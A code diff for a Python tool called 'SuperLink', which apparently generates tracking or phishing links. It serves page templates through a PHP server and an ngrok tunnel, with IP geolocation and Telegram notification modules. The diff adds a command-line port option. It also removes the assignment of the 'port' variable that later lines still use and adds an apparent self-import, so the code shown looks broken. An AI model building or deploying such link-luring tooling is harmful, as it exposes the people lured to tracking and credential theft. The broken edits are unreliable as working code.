@@ -1,3 +1,4 @@
+from argparse import ArgumentParser
 from json import loads
 from os import getcwd, getlogin, listdir, name, stat, system
 from pathlib import Path
@@ -19,6 +20,7 @@ from Modules.geoip import GeolocationIP
 from Modules.loadTemplates import loadTemplatePath
 from Modules.notifier import TelegramBot
 from Modules.timeOptions import TimeOptions
+from SuperLink import port
 
 LG = Fore.LIGHTGREEN_EX  # light green
 LR = Fore.LIGHTRED_EX  # light red
@@ -43,6 +45,14 @@ if name == "nt":
         exit()
 else:
     pass
+
+
+parser = ArgumentParser(prog="SuperLink")
+parser.add_argument("-p", "--port",
+                    type=int, default=4545,
+                    help="The port for PHP server & ngrok tunnel [ Default : 4545 ]")
+args = parser.parse_args()
+PORT = args.port
 
 
 def banner():
@@ -306,7 +316,7 @@ class TMprint:
 class MainServer:
     def __init__(self, template_path, port=None, proto=None):
         self.conf_file = CheckConfigFile()
-        self.def_port = "4040"
+        self.def_port = PORT
         self.def_proto = "http"
         self.port = port
         self.template_path = template_path
@@ -331,18 +341,14 @@ class MainServer:
             proto = self.def_proto
         else:
             proto = self.proto
-        if self.port is None:
-            port = self.def_port
-        else:
-            port = self.port
         try:
             self.tprint.out(LG + " [>] Starting PHP server on port" + LW + f" ({port})")
             sleep(3)
             with open("./Logs/PHP-Log/PHP_SERVER_LOG.log", "w") as php_log:
-                Popen(("php", "-S", f"localhost:{port}", "-t", self.template_path),
+                Popen(("php", "-S", f"localhost:{port}", "-t", self.template_path), 
                       stderr=php_log, stdout=php_log)
                 self.tprint.out(LG + " [>] Generating the link...")
-                link = str(ngrok.connect(port, proto,
+                link = str(ngrok.connect(self.def_port, proto,
                                          region=self.ngrok_region,
                                          auth_token=self.ngrok_auth_token))
                 local_mode = link.split(" ")[3].replace('"', '')
